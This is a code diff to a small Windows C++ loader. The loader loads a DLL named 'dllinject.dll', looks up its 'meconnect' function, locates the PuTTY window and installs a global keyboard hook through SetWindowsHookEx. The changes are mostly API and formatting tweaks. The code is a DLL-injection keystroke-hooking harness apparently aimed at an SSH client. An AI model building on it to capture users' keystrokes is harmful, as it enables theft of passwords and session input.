@@ -8,8 +8,9 @@ int _tmain(int argc, _TCHAR* argv[])
 	/*
 	 * Load library in which we'll be hooking our functions.
 	 */
-	HMODULE dll = LoadLibrary(L"C:\\drivers\\dllinject.dll");
-	if(dll == NULL) {
+	HMODULE dll = LoadLibraryA("C:\\Users\\admin\\Desktop\\visual-studio-projects\\dllinject\\x64\\Debug\\dllinject.dll");
+	if(dll == NULL) 
+	{
 		printf("The DLL could not be found.\n");
 		getchar();
 		return -1;
@@ -19,7 +20,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	 * Get the address of the function inside the DLL.
 	 */
 	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, "meconnect");
-	if(addr == NULL) {
+	if(addr == NULL) 
+	{
 		printf("The function was not found.\n");
 		getchar();
 		return -1;
@@ -29,7 +31,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	 * Window name
 	 */
 	unsigned long procID;
-    HWND targetWnd = FindWindow(NULL, L"putty.exe");
+    HWND targetWnd = FindWindowA(NULL, "putty.exe");
     GetWindowThreadProcessId(targetWnd, &procID);
 
 	/*
@@ -37,7 +39,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	 */ 
 	HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, 0);
 	//HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, keyboard_hook, dll, 0);
-	if(handle == NULL) {
+	if(handle == NULL) 
+	{
 		printf("The KEYBOARD could not be hooked.\n");
 	}
 
